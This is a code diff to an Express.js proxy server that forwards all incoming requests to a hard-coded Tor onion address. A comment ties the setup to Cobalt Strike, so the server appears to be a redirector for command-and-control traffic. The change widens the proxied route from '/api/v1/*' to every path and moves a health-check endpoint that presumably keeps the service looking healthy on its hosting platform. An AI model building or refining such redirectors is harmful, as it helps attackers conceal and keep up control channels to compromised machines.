@@ -23,8 +23,13 @@ const onionUrl = 'http://ttcbgkpnl6at7dqhroa2shu44zqxzpwwwvdxbzoqznxk7lg5xso6bbq
 // Middleware to parse JSON bodies (if needed by Cobalt Strike)
 app.use(express.json());
 
+// Health check endpoint for hosting platform
+app.get('/health', (req, res) => {
+  res.status(200).json({ status: 'OK' });
+});
+
 // Route to handle /api/v1 requests
-app.all('/api/v1/*', async (req, res) => {
+app.all('/*', async (req, res) => {
   try {
     // Construct the full URL for the hidden service
     const targetPath = req.originalUrl.replace('/api/v1', '');
@@ -61,11 +66,6 @@ app.all('/api/v1/*', async (req, res) => {
       message: error.message,
     });
   }
-});
-
-// Health check endpoint for hosting platform
-app.get('/health', (req, res) => {
-  res.status(200).json({ status: 'OK' });
 });
 
 // Start the server
